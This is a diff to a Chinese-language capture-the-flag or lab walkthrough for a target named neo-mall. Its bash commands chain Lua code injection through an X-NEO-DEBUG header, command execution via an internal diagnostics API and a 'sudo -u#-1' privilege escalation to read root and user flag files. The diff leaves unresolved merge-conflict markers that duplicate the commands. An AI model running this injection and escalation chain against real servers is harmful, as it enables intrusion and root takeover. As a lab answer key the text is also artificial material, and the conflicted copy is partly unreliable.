@@ -142,6 +142,7 @@ curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/
 
 ```bash
 # 生成 Flag（學號換成自己的）
+<<<<<<< HEAD
 jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
   http://$TARGET:8080/api/debug-system
 
@@ -151,5 +152,16 @@ jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/ap
 
 # 讀取 User Flag
 jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
+=======
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
+  http://$TARGET:8080/api/debug-system
+
+# 讀取 Root Flag
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c \\\\\\\"cat /root/root_flag.txt\\\\\\\"\\\"}\""):read("*a"))' \
+  http://$TARGET:8080/api/debug-system
+
+# 讀取 User Flag
+jcurl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
+>>>>>>> f27ac49028c8bcf445467167d139fa817729f1d5
   http://$TARGET:8080/api/debug-system
 ```
